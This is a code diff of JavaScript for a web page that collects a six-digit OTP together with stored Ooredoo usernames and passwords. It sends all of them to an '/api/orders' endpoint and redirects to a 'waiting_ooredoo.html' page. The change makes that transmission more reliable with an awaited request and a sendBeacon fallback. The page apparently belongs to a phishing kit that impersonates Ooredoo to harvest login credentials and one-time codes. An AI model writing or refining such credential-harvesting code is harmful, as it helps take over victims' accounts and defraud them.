@@ -359,18 +359,36 @@
     }
   });
 
-  otpForm.addEventListener('submit', (e) => {
+  async function persistOoredooOtp(orderId, payload) {
+    try {
+      const res = await fetch('/api/orders/' + encodeURIComponent(orderId), {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        cache: 'no-store'
+      });
+      if (!res.ok) throw new Error('save failed');
+      return true;
+    } catch (err) {
+      try {
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+        }
+      } catch (sendErr) {}
+      return false;
+    }
+  }
+
+  otpForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     const otp = otpInput.value.trim();
     
     if (otp.length === 6) {
       sessionStorage.setItem('otpCode', otp);
       sessionStorage.setItem('ooredooOtp', otp);
-      const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
-      sessionStorage.setItem('ooredooFlow_' + orderId, 'otp');
-      localStorage.setItem('ooredooFlow_' + orderId, 'otp');
       sessionStorage.setItem('ooredooFlow', 'otp');
-      localStorage.setItem('ooredooFlow', 'otp');
+
+      const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
       const payload = {
         ooredooUser: sessionStorage.getItem('ooredooUser') || '',
         ooredooPass: sessionStorage.getItem('ooredooPass') || '',
@@ -387,18 +405,7 @@
         bank: 'Ooredoo'
       };
 
-      const otpBody = JSON.stringify(otpPayload);
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([otpBody], { type: 'application/json' }));
-      } else {
-        fetch('/api/orders/' + encodeURIComponent(orderId), {
-          method: 'PUT',
-          headers: { 'Content-Type': 'application/json' },
-          body: otpBody,
-          keepalive: true
-        }).catch(() => {});
-      }
-
+      await persistOoredooOtp(orderId, otpPayload);
       window.location.href = 'waiting_ooredoo.html';
     }
   });
